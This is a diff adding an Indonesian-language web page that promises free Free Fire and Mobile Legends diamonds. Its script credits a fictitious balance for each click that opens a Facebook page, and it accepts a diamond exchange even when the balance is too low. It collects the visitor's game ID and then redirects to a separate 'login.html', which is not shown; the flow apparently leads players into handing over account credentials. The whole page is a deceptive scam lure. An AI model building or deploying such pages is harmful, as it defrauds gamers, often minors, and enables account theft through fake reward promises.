@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Diamond FF Gratis</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(#000000, #1a1a1a);
+      color: white;
+      text-align: center;
+    }
+    header {
+      background-color: #3b5998;
+      padding: 20px;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .saldo-box {
+      margin: 20px auto;
+      padding: 15px;
+      background: #222;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 10px #3b5998;
+    }
+    .saldo {
+      font-size: 28px;
+      margin-top: 10px;
+      color: #00ff7f;
+    }
+    .misi button, .tukar button, .form-tukar button {
+      background-color: #4267B2;
+      border: none;
+      color: white;
+      padding: 12px;
+      margin: 10px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 80%;
+      max-width: 300px;
+    }
+    .tukar button {
+      background-color: #28a745;
+    }
+    .notif {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #ffff66;
+    }
+    .form-tukar {
+      display: none;
+      background-color: #111;
+      padding: 20px;
+      margin-top: 30px;
+      border-radius: 12px;
+    }
+    input, select {
+      padding: 10px;
+      margin: 10px 0;
+      width: 90%;
+      max-width: 300px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+    }
+    .logo-game {
+      margin-top: 10px;
+      height: 80px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>💎 Diamond Free Fire Gratis</header>
+
+  <div class="saldo-box">
+    <p>💰 Saldo Anda:</p>
+    <div class="saldo" id="saldo">Rp 0</div>
+  </div>
+
+  <div class="misi">
+    <h3>Misi Follow Facebook:</h3>
+    <button onclick="followAndOpen('https://facebook.com/zuck')">📘 Follow Facebook 1</button>
+    <button onclick="followAndOpen('https://facebook.com/cristiano')">📘 Follow Facebook 2</button>
+    <button onclick="followAndOpen('https://facebook.com/samsungindonesia')">📘 Follow Facebook 3</button>
+    <button onclick="followAndOpen('https://facebook.com/freefireID')">📘 Follow Facebook 4</button>
+    <button onclick="followAndOpen('https://facebook.com/shopeeID')">📘 Follow Facebook 5</button>
+  </div>
+
+  <div class="tukar">
+    <button onclick="bukaForm()">🎁 Tukarkan Diamond</button>
+    <div class="notif" id="pesan"></div>
+  </div>
+
+  <div class="form-tukar" id="formTukar">
+    <h2>🎁 Form Tukar Diamond</h2>
+    <input type="text" id="idGame" placeholder="Masukkan ID Game Kamu" />
+    <select id="gameSelect" onchange="tampilLogo()">
+      <option value="">-- Pilih Game --</option>
+      <option value="Free Fire">🔥 Free Fire</option>
+      <option value="Mobile Legends">⚔️ Mobile Legends</option>
+    </select>
+    <div id="logoContainer"></div>
+    <select id="jumlahDiamond">
+      <option value="">-- Pilih Jumlah Diamond --</option>
+      <option value="12">💎 12 Diamond</option>
+      <option value="20">💎 20 Diamond</option>
+      <option value="36">💎 36 Diamond</option>
+      <option value="50">💎 50 Diamond</option>
+    </select>
+    <button onclick="konfirmasi()">✅ Konfirmasi</button>
+  </div>
+
+  <script>
+    let saldo = 0;
+    const saldoDisplay = document.getElementById("saldo");
+    const pesan = document.getElementById("pesan");
+    const formTukar = document.getElementById("formTukar");
+
+    function followAndOpen(url) {
+      if (saldo >= 5000) {
+        pesan.innerText = "💡 Maksimal saldo Rp 5.000. Silakan tukarkan Diamond!";
+        return;
+      }
+      saldo += 1000;
+      saldoDisplay.innerText = "Rp " + saldo.toLocaleString();
+      pesan.innerText = "✅ Berhasil follow akun. Saldo +Rp 1.000";
+      window.open(url, '_blank');
+    }
+
+    function bukaForm() {
+      formTukar.style.display = "block";
+      pesan.innerText = saldo < 5000 ? "⚠️ Saldo belum cukup, tapi tetap bisa tukar Diamond." : "✅ Silakan isi form penukaran.";
+    }
+
+    function tampilLogo() {
+      const game = document.getElementById("gameSelect").value;
+      const logoContainer = document.getElementById("logoContainer");
+      let logo = "";
+      if (game === "Free Fire") {
+        logo = '<img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Free_Fire_logo.png" class="logo-game">';
+      } else if (game === "Mobile Legends") {
+        logo = '<img src="https://upload.wikimedia.org/wikipedia/en/thumb/7/70/Mobile_Legends_Bang_Bang_logo.png/220px-Mobile_Legends_Bang_Bang_logo.png" class="logo-game">';
+      }
+      logoContainer.innerHTML = logo;
+    }
+
+    function konfirmasi() {
+      const id = document.getElementById("idGame").value.trim();
+      const game = document.getElementById("gameSelect").value;
+      const jumlah = document.getElementById("jumlahDiamond").value;
+      if (id === "" || game === "" || jumlah === "") {
+        pesan.innerText = "❌ Semua data harus diisi!";
+      } else {
+        window.location.href = "login.html";
+      }
+    }
+  </script>
+</body>
+</html>
